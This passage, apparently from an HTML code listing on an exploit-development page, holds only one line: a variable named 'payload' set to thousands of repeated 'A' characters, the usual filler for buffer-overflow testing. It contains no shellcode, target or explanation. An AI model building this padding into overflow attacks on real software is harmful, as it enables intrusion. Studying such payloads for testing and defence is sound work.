class="line">payload&#x3D;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA